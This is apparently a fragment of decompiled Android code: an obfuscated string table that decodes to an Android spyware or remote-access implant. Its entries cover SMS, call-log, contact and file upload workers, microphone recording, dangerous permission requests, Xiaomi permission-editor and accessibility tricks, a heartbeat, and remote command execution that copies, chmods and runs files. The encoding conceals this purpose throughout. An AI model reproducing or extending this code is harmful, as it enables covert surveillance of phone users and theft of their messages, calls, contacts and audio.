ﾖﾒﾚ￹ﾌﾎﾊᯟﾞﾔ￼ﾒﾖﾜ￹ﾜﾞﾒᯟﾍﾞ￰ﾬﾋﾞᯈﾋﾚﾛ￟ﾷﾊﾒﾒﾖﾑﾘ￻￑ﾞﾒᯈ￰ﾷﾊﾒᯗﾖﾑﾘ￟ﾬﾋﾐﾏﾏﾚﾛ￵ﾠﾙﾍᯕﾑﾋ￑ﾕﾏﾘ￶ﾠﾝﾞᯙﾔ￑ﾕﾏﾘ￱ﾪﾏﾛᯛﾋﾚﾌﾼﾗﾞﾑﾑﾚﾓ￳ﾑﾐﾋᯓﾙﾖﾜﾞﾋﾖﾐﾑ￳ﾑﾐﾋᯓﾙﾖﾜﾞﾋﾖﾐﾑ￨ﾬﾆﾑᯙﾗﾍﾐﾑﾖﾅﾞﾋﾖﾐﾑ￟ﾼﾗﾞﾑﾑﾚﾓ￨ﾬﾆﾑᯙﾗﾍﾐﾑﾖﾅﾞﾋﾖﾐﾑ￟ﾼﾗﾞﾑﾑﾚﾓ￸ﾌﾚﾍᯌﾖﾜﾚ￴ﾪﾏﾛᯛﾋﾖﾑﾘ￑￑￑￫ﾼﾗﾚᯙﾔﾖﾑﾘ￟ﾙﾐﾍ￟ﾊﾏﾛﾞﾋﾚﾌ￬ﾱﾐﾋᮚﾆﾚﾋ￟ﾖﾒﾏﾓﾚﾒﾚﾑﾋﾚﾛ￴ﾬﾆﾑᯙﾼﾗﾞﾑﾑﾚﾓ￳ﾑﾐﾋᯓﾙﾖﾜﾞﾋﾖﾐﾑ￨ﾫﾞﾌᯑ￟ﾲﾞﾑﾞﾘﾚﾒﾚﾑﾋ￟ﾼﾗﾞﾑﾑﾚﾓ￸ﾌﾚﾍᯌﾖﾜﾚ￴ﾪﾏﾛᯛﾋﾖﾑﾘ￑￑￑￫ﾼﾗﾚᯙﾔﾖﾑﾘ￟ﾙﾐﾍ￟ﾊﾏﾛﾞﾋﾚﾌ￬ﾱﾐﾋᮚﾆﾚﾋ￟ﾖﾒﾏﾓﾚﾒﾚﾑﾋﾚﾛ￪ﾫﾞﾌᯑﾲﾞﾑﾞﾘﾚﾒﾚﾑﾋﾼﾗﾞﾑﾑﾚﾓￜﾨﾆﾑᯑﾖﾑﾘ￟ﾲﾚﾛﾖﾞﾯﾍﾐﾕﾚﾜﾋﾖﾐﾑﾬﾋﾐﾏﾼﾞﾓﾓﾝﾞﾜﾔ￫ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾇￒﾝﾖﾑﾞﾍﾆ￶ﾧￒﾹ᯳ﾳﾺￒﾶﾻ￰ﾈﾖﾑᯑﾺﾇﾋﾚﾑﾛﾯﾍﾚﾙﾌ￴ﾈﾖﾑᯑﾺﾑﾛﾫﾖﾒﾚ￰ﾈﾖﾑᯑﾺﾇﾋﾚﾑﾛﾯﾍﾚﾙﾌ￴ﾈﾖﾑᯑﾺﾑﾛﾫﾖﾒﾚ￰ﾈﾖﾑᯑﾺﾇﾋﾚﾑﾛﾯﾍﾚﾙﾌ￴ﾈﾖﾑᯑﾺﾑﾛﾫﾖﾒﾚ￹ﾈﾖﾑᯞﾐﾈ￘ﾬﾜﾍᯟﾚﾑ￟ﾭﾚﾜﾐﾍﾛ￟ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￟ﾖﾌ￟ﾑﾐﾋ￟ﾘﾍﾞﾑﾋﾚﾛ￺ﾛﾚﾓᯛﾆ￐ﾪﾑﾞᯘﾓﾚ￟ﾋﾐ￟ﾌﾋﾞﾍﾋ￟ﾍﾚﾜﾐﾍﾛﾖﾑﾘ￟ￗﾾﾑﾛﾍﾐﾖﾛ￟ﾩﾚﾍﾌﾖﾐﾑ￟ￃ￟ￊￖ￴ﾨﾆﾑᯑﾬﾚﾍﾉﾖﾜﾚ￸ﾺﾍﾍᯕﾍￅ￟￺ﾏﾐﾈᯟﾍ￷ﾔﾚﾆᯝﾊﾞﾍﾛ￈ﾼﾞﾊᯝﾗﾋ￟ﾭﾊﾑﾋﾖﾒﾚ￟ﾚﾇﾜﾚﾏﾋﾖﾐﾑ￟ﾈﾗﾚﾑ￟ﾌﾜﾍﾚﾚﾑ￟ﾐﾙﾙￓ￟ﾎﾊﾚﾊﾚﾖﾑﾘ￟ﾈﾆﾑﾔ￶ￕﾤﾺ᯷ﾯﾫﾦﾢￕￓﾼﾞﾊᯝﾗﾋ￟ﾭﾊﾑﾋﾖﾒﾚ￟ﾚﾇﾜﾚﾏﾋﾖﾐﾑ￟ﾈﾗﾚﾑ￟ﾌﾜﾍﾚﾚﾑ￟ﾖﾌ￟ﾐﾑￅ￟￪ﾺﾇﾖᯎﾚﾛ￟ﾙﾍﾐﾒ￟ﾨﾆﾑﾔ￟ﾓﾐﾐﾏ￴ﾨﾆﾑᯑﾬﾚﾍﾉﾖﾜﾚ￯ﾹﾞﾖᯖﾚﾛ￟ﾋﾐ￟ﾌﾋﾐﾏￅ￟￷ﾰﾫﾾᮚﾯﾊﾌﾗ￳ﾑﾐﾋᯓﾙﾖﾜﾞﾋﾖﾐﾑ￺ﾈﾆﾑᯑﾌ￯ﾒﾚﾛᯓﾞﾠﾏﾍﾐﾕﾚﾜﾋﾖﾐﾑ￹ﾈﾖﾑᯞﾐﾈ￵ﾾﾏﾏᮚﾪﾏﾛﾞﾋﾚ￷ﾰﾫﾾᮚﾯﾊﾌﾗ￷ﾰﾫﾾᮚﾯﾊﾌﾗ￼ﾒﾌﾘ￴ﾪﾏﾛᯛﾋﾖﾑﾘ￑￑￑￫ﾼﾗﾚᯙﾔﾖﾑﾘ￟ﾙﾐﾍ￟ﾊﾏﾛﾞﾋﾚﾌ￻ﾻﾾﾫ᯻￴ﾭﾺﾬᯯﾳﾫﾠﾼﾰﾻﾺ￰ﾬﾋﾞᯈﾋﾚﾛ￟ﾨﾆﾑﾔﾖﾑﾘ￵ﾞﾑﾛᯈﾐﾖﾛﾠﾖﾛ￶ﾞﾑﾛᯈﾐﾖﾛﾶﾛ￳ﾒﾞﾑᯏﾙﾞﾜﾋﾊﾍﾚﾍ￸ﾉﾚﾍᯉﾖﾐﾑ￱ﾉﾚﾍᯉﾖﾐﾑﾭﾚﾓﾚﾞﾌﾚ￴ﾒﾐﾛᯟﾓﾱﾊﾒﾝﾚﾍ￺ﾈﾖﾛᯎﾗ￹ﾗﾚﾖᯝﾗﾋ￺ﾛﾚﾓᯛﾆ￸ﾝﾖﾋᯈﾞﾋﾚ￸ﾚﾑﾜᯕﾛﾚﾍ￹ﾛﾚﾉᯓﾜﾚ￷ﾏﾖﾑᯝﾫﾖﾒﾚ￶ﾋﾖﾒᯟﾌﾋﾞﾒﾏ￶ﾌﾋﾞᯈﾋﾚﾛﾾﾋ￰ﾚﾇﾏᯟﾜﾋﾚﾛﾺﾑﾛﾫﾖﾒﾚ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￺ﾛﾚﾓᯛﾆ￺ﾛﾚﾓᯛﾆ￺ﾈﾖﾛᯎﾗ￺ﾈﾖﾛᯎﾗ￹ﾗﾚﾖᯝﾗﾋ￹ﾗﾚﾖᯝﾗﾋ￸ﾝﾖﾋᯈﾞﾋﾚ￸ﾝﾖﾋᯈﾞﾋﾚ￸ﾚﾑﾜᯕﾛﾚﾍ￸ﾚﾑﾜᯕﾛﾚﾍ￸ﾝﾖﾋᯈﾞﾋﾚ￸ﾚﾑﾜᯕﾛﾚﾍ￺ﾈﾖﾛᯎﾗ￹ﾗﾚﾖᯝﾗﾋ￻￑ﾒﾏᮎ￹ﾨﾆﾑᯑﾚﾍ￯ﾲﾐﾑᯓﾋﾐﾍﾖﾑﾘﾬﾋﾞﾋﾊﾌ￴ﾾﾻﾲ᯳ﾱﾠﾯﾭﾺﾹﾬ￯ﾲﾐﾑᯓﾋﾐﾍﾖﾑﾘﾬﾋﾞﾋﾊﾌ￯ﾲﾐﾑᯓﾋﾐﾍﾖﾑﾘﾬﾋﾞﾋﾊﾌ￯ﾲﾐﾑᯓﾋﾐﾍﾖﾑﾘﾬﾋﾞﾋﾊﾌ￵￑ﾞﾊᯞﾖﾐﾠﾍﾚﾜ￵￑ﾞﾊᯞﾖﾐﾠﾒﾐﾑ￵￑ﾞﾊᯞﾖﾐﾠﾎﾊﾚ￶￑ﾜﾐᯔﾋﾞﾜﾋﾌ￶ﾖﾑﾘᯈﾚﾌﾌﾶﾛ￻ﾝﾐﾛᯃ￹ﾌﾚﾑᯞﾫﾐ￶ﾋﾖﾒᯟﾌﾋﾞﾒﾏ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￲ﾾﾓﾙᯈﾚﾛﾬﾚﾍﾉﾖﾜﾚ￭ﾬﾋﾐᯊﾏﾚﾛ￟ﾲﾐﾑﾖﾋﾐﾍﾖﾑﾘ￶￑ﾏﾚᯈﾒﾠﾒﾐﾑ￸￑ﾒﾖᯥﾎﾊﾚ￲ﾾﾓﾙᯈﾚﾛﾬﾚﾍﾉﾖﾜﾚ￬ﾬﾋﾞᯈﾋﾖﾑﾘ￟ﾲﾐﾑﾖﾋﾐﾍﾖﾑﾘ￩￑ﾜﾞᯔﾠﾓﾞﾊﾑﾜﾗﾠﾇﾠﾞﾜﾋﾖﾉﾖﾋﾆ￱ﾐﾏﾚᯔﾬﾚﾓﾙﾲﾶﾪﾶﾽﾘ￹ﾣﾌﾄᮈￓﾂ￲￐ﾏﾍᯕﾜ￐ﾑﾚﾋ￐ﾞﾍﾏ￿￹ﾣﾌﾄᮈￓﾂ￴ﾜﾐﾑᯔﾚﾜﾋﾖﾐﾑﾌ￬ﾓﾐﾛᯝﾚￅￅﾱﾚﾋﾈﾐﾍﾔﾪﾋﾖﾓﾌ￸ﾺﾍﾍᯕﾍￅ￟￬ﾓﾐﾛᯝﾚￅￅﾱﾚﾋﾈﾐﾍﾔﾪﾋﾖﾓﾌ￟ﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾭﾺﾾﾻﾠﾼﾰﾱﾫﾾﾼﾫﾬ￞ﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾨﾭﾶﾫﾺﾠﾼﾰﾱﾫﾾﾼﾫﾬ￤ﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾭﾺﾾﾻﾠﾬﾲﾬ￤ﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾬﾺﾱﾻﾠﾬﾲﾬ￡ﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚ";
        strArr[1] = "ﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾭﾺﾼﾺﾶﾩﾺﾠﾬﾲﾬ￢ﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾼﾾﾳﾳﾠﾯﾷﾰﾱﾺ￟ﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾭﾺﾾﾻﾠﾼﾾﾳﾳﾠﾳﾰﾸ￞ﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾨﾭﾶﾫﾺﾠﾼﾾﾳﾳﾠﾳﾰﾸ￠ﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾭﾺﾼﾰﾭﾻﾠﾾﾪﾻﾶﾰￗﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾭﾺﾾﾻﾠﾺﾧﾫﾺﾭﾱﾾﾳﾠﾬﾫﾰﾭﾾﾸﾺￖﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾨﾭﾶﾫﾺﾠﾺﾧﾫﾺﾭﾱﾾﾳﾠﾬﾫﾰﾭﾾﾸﾺ￘ﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾾﾼﾼﾺﾬﾬﾠﾹﾶﾱﾺﾠﾳﾰﾼﾾﾫﾶﾰﾱￖﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾾﾼﾼﾺﾬﾬﾠﾼﾰﾾﾭﾬﾺﾠﾳﾰﾼﾾﾫﾶﾰﾱ￢ﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾼﾾﾳﾳﾠﾯﾷﾰﾱﾺ￦ﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾼﾾﾲﾺﾭﾾￕﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾲﾾﾱﾾﾸﾺﾠﾺﾧﾫﾺﾭﾱﾾﾳﾠﾬﾫﾰﾭﾾﾸﾺￚﾜﾐﾒᮔﾞﾑﾛﾍﾐﾖﾛ￑ﾚﾇﾋﾚﾍﾑﾞﾓﾌﾋﾐﾍﾞﾘﾚ￑ﾛﾐﾜﾊﾒﾚﾑﾋﾌ￫ﾏﾍﾖᯗﾞﾍﾆￅﾾﾑﾛﾍﾐﾖﾛ￐ﾛﾞﾋﾞￕﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾲﾾﾱﾾﾸﾺﾠﾺﾧﾫﾺﾭﾱﾾﾳﾠﾬﾫﾰﾭﾾﾸﾺￕﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾲﾾﾱﾾﾸﾺﾠﾺﾧﾫﾺﾭﾱﾾﾳﾠﾬﾫﾰﾭﾾﾸﾺￕﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾲﾾﾱﾾﾸﾺﾠﾺﾧﾫﾺﾭﾱﾾﾳﾠﾬﾫﾰﾭﾾﾸﾺￕﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾲﾾﾱﾾﾸﾺﾠﾺﾧﾫﾺﾭﾱﾾﾳﾠﾬﾫﾰﾭﾾﾸﾺ￷￑ﾈﾑᯑﾠﾍﾚﾜ￷￑ﾈﾑᯑﾠﾒﾐﾑ￷￑ﾈﾑᯑﾠﾎﾊﾚ￞ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾾﾏﾏﾶﾑﾙﾐﾭﾚﾏﾐﾍﾋﾨﾐﾍﾔﾚﾍ￶ﾍﾚﾜᯕﾍﾛﾖﾑﾘ￫ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾇￒﾝﾖﾑﾞﾍﾆ￶ﾧￒﾹ᯳ﾳﾺￒﾶﾻ￯ﾬﾋﾞᯈﾋ￟ﾷﾊﾒ￟ﾪﾏﾓﾐﾞﾛ￭ﾷﾊﾒᮚﾪﾏﾓﾐﾞﾛ￟ﾬﾋﾐﾏﾏﾚﾛ￫ﾾﾊﾛᯓﾐﾭﾚﾜﾐﾍﾛﾖﾑﾘﾪﾏﾓﾐﾞﾛ￣ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾾﾊﾋﾐﾬﾆﾑﾜﾨﾐﾍﾔﾚﾍ￢ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾽﾞﾌﾖﾜﾶﾑﾙﾐﾨﾐﾍﾔﾚﾍ￞ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾼﾞﾓﾓﾳﾐﾘﾭﾚﾏﾐﾍﾋﾨﾐﾍﾔﾚﾍ￠ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾼﾐﾑﾋﾞﾜﾋﾶﾑﾙﾐﾨﾐﾍﾔﾚﾍ￣ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾹﾖﾓﾚﾯﾞﾋﾗﾨﾐﾍﾔﾚﾍ￴ﾙﾜﾒ᯳ﾑﾌﾋﾞﾑﾜﾚ￴ﾙﾜﾒ᯳ﾑﾌﾋﾞﾑﾜﾚ￪ﾹﾼﾲᯨﾚﾘﾖﾌﾋﾍﾞﾋﾖﾐﾑﾨﾐﾍﾔﾚﾍ￴ﾙﾜﾒ᯳ﾑﾌﾋﾞﾑﾜﾚ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￶ﾝﾞﾌᯓﾜﾶﾑﾙﾐ￶ﾝﾞﾌᯓﾜﾶﾑﾙﾐ￴ﾜﾐﾑᯎﾞﾜﾋﾶﾑﾙﾐ￴ﾜﾐﾑᯎﾞﾜﾋﾶﾑﾙﾐ￷ﾙﾖﾓᯟﾬﾆﾑﾜ￷ﾙﾖﾓᯟﾬﾆﾑﾜ￵ﾙﾖﾓᯟﾭﾚﾏﾐﾍﾋ￵ﾙﾖﾓᯟﾭﾚﾏﾐﾍﾋ￨ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾷﾚﾞﾍﾋﾝﾚﾞﾋ￷ﾓﾐﾜᯛﾋﾖﾐﾑ￘ﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾾﾼﾼﾺﾬﾬﾠﾹﾶﾱﾺﾠﾳﾰﾼﾾﾫﾶﾰﾱￖﾞﾑﾛᯈﾐﾖﾛ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑ￑ﾾﾼﾼﾺﾬﾬﾠﾼﾰﾾﾭﾬﾺﾠﾳﾰﾼﾾﾫﾶﾰﾱ￼ﾘﾏﾌ￼ﾘﾏﾌ￸ﾑﾚﾋᯍﾐﾍﾔ￶ﾞﾑﾛᯈﾐﾖﾛﾶﾛ￷ﾓﾞﾋᯓﾋﾊﾛﾚ￶ﾓﾐﾑᯝﾖﾋﾊﾛﾚ￵ﾞﾑﾛᯈﾐﾖﾛﾠﾖﾛ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￞ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾳﾖﾉﾚﾽﾞﾌﾖﾜﾶﾑﾙﾐﾨﾐﾍﾔﾚﾍ￙ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾯﾗﾐﾑﾚﾲﾚﾌﾌﾞﾘﾚﾭﾚﾏﾐﾍﾋﾨﾐﾍﾔﾚﾍ￣ﾫﾞﾌᯑﾠﾻﾖﾍﾚﾜﾋﾠﾺﾇﾚﾜﾊﾋﾖﾐﾑﾠﾨﾐﾍﾔﾚﾍ￺ﾋﾞﾌᯑﾌ￼ﾝﾖﾑ￻ﾜﾐﾑᯜ￼ﾐﾊﾋ￼ﾛﾚﾉ￵ﾞﾑﾛᯈﾐﾖﾛﾠﾖﾛ￶ﾞﾑﾛᯈﾐﾖﾛﾶﾛ￳ﾒﾞﾑᯏﾙﾞﾜﾋﾊﾍﾚﾍ￸ﾉﾚﾍᯉﾖﾐﾑ￱ﾉﾚﾍᯉﾖﾐﾑﾭﾚﾓﾚﾞﾌﾚ￴ﾒﾐﾛᯟﾓﾱﾊﾒﾝﾚﾍ￹ﾛﾚﾉᯓﾜﾚ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￹ﾛﾚﾉᯓﾜﾚ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￹ﾋﾞﾌᯑﾶﾛ￹ﾛﾚﾉᯓﾜﾚ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￹ﾋﾞﾌᯑﾶﾛ￹ﾋﾞﾌᯑﾶﾛ￼ﾚﾑﾉ￺ￚﾌￂᮟﾌ￹ﾋﾞﾌᯑﾶﾛ￹ﾋﾞﾌᯑﾶﾛ￹ﾋﾞﾌᯑﾶﾛ￰ﾾﾋﾋᯟﾒﾏﾋ￟ﾫﾞﾌﾔ￟ￅ￟￬ﾺﾇﾚᯙ￟ﾹﾖﾓﾚ￟ﾼﾐﾏﾖﾚﾛ￟ￅ￟￴ﾜﾗﾒᯕﾛ￟ￔﾇ￟ￚﾌ￰ﾼﾗﾒᯕﾛ￟ﾍﾚﾋﾩﾞﾓ￟ￅ￟￷￟ﾫﾞᯉﾔ￟ￅ￟￮ﾺﾇﾚᯙﾊﾋﾖﾑﾘ￟ﾫﾞﾌﾔ￟ￅ￟￬ﾻﾐﾑᯟ￞￟ﾫﾞﾌﾔ￟ﾍﾚﾋﾩﾞﾓ￟ￅ￷￟ﾫﾞᯉﾔ￟ￅ￟￹ﾋﾞﾌᯑﾶﾛ￹ﾋﾞﾌᯑﾶﾛ￶ﾋﾖﾒᯟﾌﾋﾞﾒﾏ￹ﾛﾚﾉᯓﾜﾚ￯ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾕﾌﾐﾑ￷ﾍﾚﾌᯊﾐﾑﾌﾚ�ﾐﾔ￸ﾜﾐﾒᯗﾞﾑﾛ￹ﾛﾚﾓᯟﾋﾚ￺ﾙﾚﾋᯙﾗ￼ﾍﾊﾑ￸ﾍﾚﾙᯈﾚﾌﾗ￹ﾋﾞﾌᯑﾶﾛ￵ﾍﾚﾙᯈﾚﾌﾗﾽﾖﾑ￹ﾋﾞﾌᯑﾶﾛ￴ﾍﾚﾙᯈﾚﾌﾗﾼﾐﾑﾙ￹ﾋﾞﾌᯑﾶﾛ￸ﾜﾐﾒᯗﾞﾑﾛ￷ﾌﾜﾗᯟﾛﾊﾓﾚ￩ﾫﾞﾌᯑﾠﾬﾜﾗﾚﾛﾊﾓﾖﾑﾘﾠﾨﾐﾍﾔﾚﾍ￻ﾏﾖﾑᯝ￡ﾫﾞﾌᯑﾠﾬﾜﾗﾚﾛﾊﾓﾚﾠﾺﾇﾚﾜﾊﾋﾖﾐﾑﾠﾨﾐﾍﾔﾚﾍ￻ﾍﾖﾑᯝ￣ﾫﾞﾌᯑﾠﾻﾖﾍﾚﾜﾋﾠﾺﾇﾚﾜﾊﾋﾖﾐﾑﾠﾨﾐﾍﾔﾚﾍ￺ﾌﾓﾚᯟﾏ￺ﾍﾚﾌᯟﾋ￡ﾫﾞﾌᯑﾠﾬﾜﾗﾚﾛﾊﾓﾚﾠﾺﾇﾚﾜﾊﾋﾖﾐﾑﾠﾨﾐﾍﾔﾚﾍ￣ﾫﾞﾌᯑﾠﾻﾖﾍﾚﾜﾋﾠﾺﾇﾚﾜﾊﾋﾖﾐﾑﾠﾨﾐﾍﾔﾚﾍ￻ﾋﾆﾏᯟￕﾫﾞﾌᯑ￟ﾺﾇﾚﾜﾊﾋﾖﾐﾑ￟ﾷﾚﾓﾏﾚﾍ￟ﾬﾊﾝﾒﾖﾋ￟ﾨﾐﾍﾔ￟ﾬﾋﾞﾍﾋﾚﾛ￑￙ﾫﾞﾌᯑ￟ﾺﾇﾚﾜﾊﾋﾖﾐﾑ￟ﾷﾚﾓﾏﾚﾍ￟ﾛﾐ￟ﾈﾐﾍﾔ￟ﾬﾋﾞﾍﾋﾚﾛ￑�ﾷﾷ￻ﾋﾖﾒᯟ￺ﾌﾋﾞᯈﾋ￼ﾚﾑﾛ￹ﾋﾞﾌᯑﾶﾛ￻ﾋﾆﾏᯟ￼ﾍﾊﾑ￸ﾌﾋﾐᯈﾞﾘﾚￜﾫﾞﾌᯑﾭﾚﾌﾊﾓﾋﾪﾏﾓﾐﾞﾛﾨﾐﾍﾔﾚﾍ￟ﾲﾞﾔﾚ￟ﾍﾚﾎﾊﾚﾌﾋ￦ﾫﾞﾌᯑﾠﾭﾚﾌﾊﾓﾋﾠﾪﾏﾓﾐﾞﾛﾠﾨﾐﾍﾔﾚﾍ￡ﾫﾞﾌᯑﾠﾬﾜﾗﾚﾛﾊﾓﾚﾠﾺﾇﾚﾜﾊﾋﾖﾐﾑﾠﾨﾐﾍﾔﾚﾍ￡ﾫﾞﾌᯑﾠﾬﾜﾗﾚﾛﾊﾓﾚﾠﾺﾇﾚﾜﾊﾋﾖﾐﾑﾠﾨﾐﾍﾔﾚﾍ￩ﾫﾞﾌᯑﾠﾬﾜﾗﾚﾛﾊﾓﾖﾑﾘﾠﾨﾐﾍﾔﾚﾍ￥ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾪﾏﾓﾐﾞﾛﾨﾐﾍﾔﾚﾍ￺ﾈﾆﾑᯑﾌ￫ﾞﾏﾏᯖﾖﾜﾞﾋﾖﾐﾑ￐ﾇￒﾝﾖﾑﾞﾍﾆ￶ﾧￒﾹ᯳ﾳﾺￒﾶﾻ￮ﾬﾋﾞᯈﾋ￟ﾨﾆﾑﾔ￟ﾪﾏﾓﾐﾞﾛ￮ﾨﾆﾑᯑ￟ﾪﾏﾓﾐﾞﾛ￟ﾻﾐﾑﾚ￑￯ﾨﾆﾑᯑﾪﾏﾓﾐﾞﾛﾨﾐﾍﾔﾚﾍ￹ﾧﾖﾞᯕﾒﾖ￲ﾾﾓﾙᯈﾚﾛﾬﾚﾍﾉﾖﾜﾚ￩ﾶﾑﾌᯓﾛﾚ￟ﾞﾜﾜﾚﾌﾌﾖﾝﾖﾓﾖﾋﾆￅ￟￝ﾒﾖﾊᯓ￑ﾖﾑﾋﾚﾑﾋ￑ﾞﾜﾋﾖﾐﾑ￑ﾾﾯﾯﾠﾯﾺﾭﾲﾠﾺﾻﾶﾫﾰﾭ￨ﾜﾐﾒᮔﾒﾖﾊﾖ￑ﾌﾚﾜﾊﾍﾖﾋﾆﾜﾚﾑﾋﾚﾍￆﾜﾐﾒᮔﾒﾖﾊﾖ￑ﾏﾚﾍﾒﾜﾚﾑﾋﾚﾍ￑ﾏﾚﾍﾒﾖﾌﾌﾖﾐﾑﾌ￑ﾯﾚﾍﾒﾖﾌﾌﾖﾐﾑﾌﾺﾛﾖﾋﾐﾍﾾﾜﾋﾖﾉﾖﾋﾆ￲ﾚﾇﾋᯈﾞﾠﾏﾔﾘﾑﾞﾒﾚ￩ﾒﾖﾊᯓﾽﾘﾳﾞﾊﾑﾜﾗﾯﾚﾍﾒﾖﾌﾌﾖﾐﾑ￩ﾒﾖﾊᯓﾽﾘﾳﾞﾊﾑﾜﾗﾯﾚﾍﾒﾖﾌﾌﾖﾐﾑ￸ﾘﾍﾞᯔﾋﾚﾛ￯ﾜﾗﾚᯙﾔﾚﾛﾫﾖﾒﾚﾬﾋﾞﾒﾏ￯ﾜﾗﾚᯙﾔﾚﾛﾫﾖﾒﾚﾬﾋﾞﾒﾏ￸ﾘﾍﾞᯔﾋﾚﾛ￭ﾾﾜﾜᯟﾌﾌﾖﾝﾖﾓﾖﾋﾆﾯﾍﾚﾙﾌ￴ﾓﾞﾌᯎﾾﾌﾔﾫﾖﾒﾚ￴ﾓﾞﾌᯎﾾﾌﾔﾫﾖﾒﾚ￲ﾛﾚﾉᯓﾜﾚﾠﾏﾐﾓﾖﾜﾆￜﾞﾑﾛᯈﾐﾖﾛ￑ﾞﾏﾏ￑ﾞﾜﾋﾖﾐﾑ￑ﾾﾻﾻﾠﾻﾺﾩﾶﾼﾺﾠﾾﾻﾲﾶﾱ￡ﾞﾑﾛᯈﾐﾖﾛ￑ﾞﾏﾏ￑ﾚﾇﾋﾍﾞ￑ﾻﾺﾩﾶﾼﾺﾠﾾﾻﾲﾶﾱ￞ﾞﾑﾛᯈﾐﾖﾛ￑ﾞﾏﾏ￑ﾚﾇﾋﾍﾞ￑ﾾﾻﾻﾠﾺﾧﾯﾳﾾﾱﾾﾫﾶﾰﾱ￯ﾬﾚﾜᯏﾍﾖﾋﾆ￟ﾲﾞﾑﾞﾘﾚﾍ￶ﾊﾌﾞᯝﾚﾶﾑﾙﾐ￪ﾖﾑﾌᯎﾞﾓﾓﾞﾋﾖﾐﾑﾫﾖﾒﾚﾬﾋﾞﾒﾏ￪ﾖﾑﾌᯎﾞﾓﾓﾞﾋﾖﾐﾑﾫﾖﾒﾚﾬﾋﾞﾒﾏ￨ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾷﾚﾞﾍﾋﾝﾚﾞﾋ￩ﾫﾞﾌᯑﾠﾬﾜﾗﾚﾛﾊﾓﾖﾑﾘﾠﾨﾐﾍﾔﾚﾍ￙ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾯﾗﾐﾑﾚﾲﾚﾌﾌﾞﾘﾚﾭﾚﾏﾐﾍﾋﾨﾐﾍﾔﾚﾍ￞ﾲﾚﾍᯙﾊﾍﾆﾧﾳﾞﾝﾌￅￅﾼﾞﾓﾓﾳﾐﾘﾭﾚﾏﾐﾍﾋﾨﾐﾍﾔﾚﾍ￩ﾫﾞﾌᯑﾠﾬﾜﾗﾚﾛﾊﾓﾖﾑﾘﾠﾨﾐﾍﾔﾚﾍ￪ﾹﾼﾲᯨﾚﾘﾖﾌﾋﾍﾞﾋﾖﾐﾑﾨﾐﾍﾔ